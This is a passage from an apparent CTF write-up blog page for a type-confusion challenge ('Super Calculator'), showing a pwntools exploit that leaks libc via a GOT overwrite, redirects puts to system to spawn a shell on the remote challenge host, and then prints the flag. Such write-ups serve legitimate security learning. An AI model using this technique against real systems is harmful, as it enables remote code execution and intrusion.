class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0 / 0&#x27;</span>) <span class="comment"># nan</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>)) <span class="comment"># float -&gt; int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">4</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 1.&#x27;</span>)</span><br><span class="line">        got1 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">        info(<span class="built_in">hex</span>(got1))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 2.&#x27;</span>)</span><br><span class="line">        got2 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment"># 7f??</span></span><br><span class="line">        info(<span class="built_in">hex</span>(got2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> got1 &gt; <span class="number">0</span>:</span><br><span class="line">            leak = <span class="built_in">hex</span>(got2) + <span class="built_in">hex</span>(got1)[<span class="number">2</span>:]</span><br><span class="line">            info(<span class="string">&#x27;leak : &#x27;</span> +leak)</span><br><span class="line">            libc.address = <span class="built_in">int</span>(leak, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">            info(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span>- <span class="built_in">len</span>(payload))</span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])   <span class="comment"># [32]</span></span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">4</span>) <span class="comment"># [33] 7f?? =&gt; got2</span></span><br><span class="line">            </span><br><span class="line">            p.send(payload)</span><br><span class="line"></span><br><span class="line">            system_low = <span class="built_in">int</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[-<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(system_low)</span><br><span class="line">            payload += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(got2)</span><br><span class="line">            pause()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> es:</span><br><span class="line">        <span class="built_in">print</span>(es)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;FUNNY_TYPECONFUSION&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&text=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&is_video=false&description=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)&body=Check out this article: https://jiravvit.github.io/230211-hcamp2023w-super_calculator/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&name=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&t=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
